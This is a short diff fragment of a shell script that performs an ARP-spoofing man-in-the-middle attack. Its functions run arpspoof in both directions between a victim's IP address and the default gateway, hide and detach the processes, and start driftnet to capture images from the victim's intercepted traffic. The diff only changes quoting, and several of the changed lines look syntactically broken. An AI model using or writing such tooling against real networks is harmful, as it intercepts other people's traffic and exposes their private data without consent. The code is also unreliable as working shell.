@@ -65,19 +65,19 @@ function trafficSelectedIp {
 
 function interceptPackages {
   print "Intercepting pacakages\n\n"
-  cmd= "arpspoof -i wlan0 -t "$victimIPAddress" "$defaultGateway
+  cmd= ("arpspoof -i wlan0 -t "$victimIPAddress" "$defaultGateway "")
 
   eval "${cmd}" &>/dev/null &disown
 }
 
 function inverseInterceptPackages {
-  cmd2= "arpspoof -i wlan0 -t "$defaultGateway" "$victimIPAddress
+  cmd2= ("arpspoof -i wlan0 -t "$defaultGateway" "$victimIPAddress "")
 
   eval "${cmd2}" &>/dev/null &disown
 }
 
 function checkImages {
-  cmd3="driftnet -i wlan0"
+  cmd3=("driftnet -i wlan0")
 
   $cmd3 &
 }
